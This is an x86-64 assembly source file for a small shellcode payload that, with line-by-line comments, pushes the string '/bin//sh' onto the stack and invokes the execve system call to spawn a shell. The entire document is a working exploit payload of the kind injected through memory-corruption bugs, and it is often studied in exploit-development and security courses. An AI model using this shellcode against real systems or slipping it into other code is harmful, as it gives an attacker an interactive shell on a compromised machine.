section .text
global _start

_start:
	xor esi, esi			    ; rsi = 0 (argv = NULL)
	xor edx, edx			    ; rdx = 0 (envp = NULL)
	
	push rsi			        ; push 8 bytes of null (string terminator)

	mov rbx, 0x68732f2f6e69622f	; Push "/bin//sh" in one go (Little-Endian)
	push rbx			        ; push to the stack

	mov al, 59			        ; execve syscall number
	mov rdi, rsp			    ; RDI now points to exactly "/bin//sh\0"
	syscall				        ; execve("path", argv[0], envp[]) 